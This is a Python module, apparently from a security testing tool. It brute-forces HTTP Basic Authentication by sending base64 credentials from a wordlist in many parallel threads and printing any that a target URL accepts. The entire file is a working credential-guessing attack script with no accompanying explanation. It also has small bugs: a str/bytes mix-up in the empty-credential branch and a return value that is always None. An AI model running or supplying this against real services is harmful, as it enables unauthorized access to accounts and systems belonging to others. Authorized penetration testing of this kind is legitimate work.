import requests
import concurrent.futures
import base64
from colorama import Fore, Style
from functions import get_info_config,load_wordlist

user_agent = get_info_config('userAgent')


def scan(url, credential, results):
    headers = {"user-agent": user_agent}
    headers['Authorization'] = credential

    try:
        resp = requests.get(url, headers=headers)
                    
        if resp.status_code != 401:
            decoded_credential = base64.b64decode(credential.split(' ')[1])
            if len(decoded_credential)==0:
                decoded_credential = "Empty (Basic Authorization header without credentials)"
            print(f"{Fore.LIGHTGREEN_EX}[CREDENTIALS FOUND]{Style.RESET_ALL} {Fore.LIGHTWHITE_EX}[{Style.RESET_ALL}{Fore.LIGHTGREEN_EX}{str(decoded_credential.decode('utf-8'))}{Style.RESET_ALL}{Fore.LIGHTWHITE_EX}]{Style.RESET_ALL}")
            return results.update({credential: decoded_credential})
    except:pass


def b64_bruteforce_launcher(url):
    results = {}
    wordlist = list(load_wordlist(get_info_config('b64_wordList')))

    with concurrent.futures.ThreadPoolExecutor(max_workers=get_info_config('threads')) as executor:
        results_executor = {executor.submit(scan, url, credential, results) for credential in wordlist}

        for item in concurrent.futures.as_completed(results_executor):
            if item.result() != None:
                print(item.result())

    return results